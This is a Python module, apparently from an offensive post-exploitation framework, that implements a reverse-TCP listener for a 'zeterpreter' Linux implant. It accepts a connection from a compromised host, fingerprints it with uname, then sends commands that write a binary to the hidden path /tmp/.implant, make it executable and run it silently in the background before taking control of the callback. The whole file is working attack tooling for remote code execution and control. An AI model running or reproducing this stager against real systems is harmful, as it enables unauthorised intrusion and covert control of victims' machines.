#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

import os
import socket
import sys

from core.badges import badges
from core.helper import helper
from core.exceptions import exceptions

class listener:
    def __init__(self):
        self.badges = badges()
        self.helper = helper()
        self.exceptions = exceptions()

    def listen(self, local_host, local_port):
        self.helper.output(self.badges.G + "Binding to " + local_host + ":" + str(local_port) + "...")
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind((local_host, local_port))
            server.listen(1)
        except:
            self.helper.output(self.badges.E + "Failed to bind to " + local_host + ":" + str(local_port) + "!")
            raise exceptions.GlobalException

        try:
            self.helper.output(self.badges.G + "Listening on port " + str(local_port) + "...")
            client, address = server.accept()
            self.helper.output(self.badges.G + "Connecting to " + address[0] + "...")

            client.send("uname -p\n".encode())
            device_arch = client.recv(128).decode().strip()
            client.send("uname -s\n".encode())
            device_os = client.recv(128).decode().strip()

            if device_os != "Linux" and device_arch != "x86_64":
                self.helper.output(self.bagdes.E + "Invalid target for " + self.details['Name'] + "!")
                raise exceptions.GlobalException

            self.helper.output(self.badges.G + "Sending Linux implant...")
            if os.path.exists("data/linux/zeterpreter/reverse_tcp/bin/implant"):
                implant_file = open("data/linux/zeterpreter/reverse_tcp/bin/implant", "rb")
                executable = implant_file.read()
                implant_file.close()
                instructions = ""
                instructions += f"cat >/tmp/.implant;"
                instructions += f"chmod 777 /tmp/.implant;"
                instructions += f"sh -c '/tmp/.implant {self.helper.encode_remote_data(local_host, str(local_port))}' 2>/dev/null &"
                instructions += "\n"
                self.helper.output(self.badges.G + "Executing Linux implant...")
            else:
                self.helper.output(self.badges.E + "Failed to send Linux implant!")
                raise exceptions.GlobalException

            client.send(instructions.encode())
            client.send(executable)
            client.close()

            self.helper.output(self.badges.G + "Establishing connection...")
            client, address = server.accept()

            from data.linux.zeterpreter.reverse_tcp.core.controller import controller
            controller = controller(client)

            return controller
        except SystemExit:
            server.close()
            raise exceptions.GlobalException
        except (KeyboardInterrupt, EOFError):
            self.helper.output("")
            raise exceptions.GlobalException